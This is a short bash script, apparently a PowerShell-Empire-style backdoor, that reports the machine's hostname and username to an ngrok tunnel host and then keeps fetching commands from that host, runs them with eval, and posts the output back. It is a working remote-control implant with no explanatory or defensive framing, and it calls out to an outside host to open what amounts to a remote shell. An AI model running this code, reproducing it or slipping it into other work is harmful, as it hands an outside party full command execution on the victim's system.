# nohup $(
s=ba47-62-19-254-230.ngrok-free.app && i=1f06d9-a329cb-83f9f6 && hname=$(hostname) && p=https://
curl -s -k "$p$s/1f06d9/$hname/$USER" -H "Authorization: $i" -H "ngrok-skip-browser-warning: 1" -o /dev/null 2>/dev/null
while :; do
    c=$(curl -s -k "$p$s/a329cb" -H "Authorization: $i" -H "ngrok-skip-browser-warning: 1" 2>/dev/null)
    if [ "$c" != None ]; then r=$(eval "$c") && if [ $r == byee ]; then pkill -P $$; else curl -s -k $p$s/83f9f6 -X POST -H "Authorization: $i" -H "ngrok-skip-browser-warning: 1" -d "$r" 2>/dev/null; fi; fi
    sleep 0.8
done
# ) &
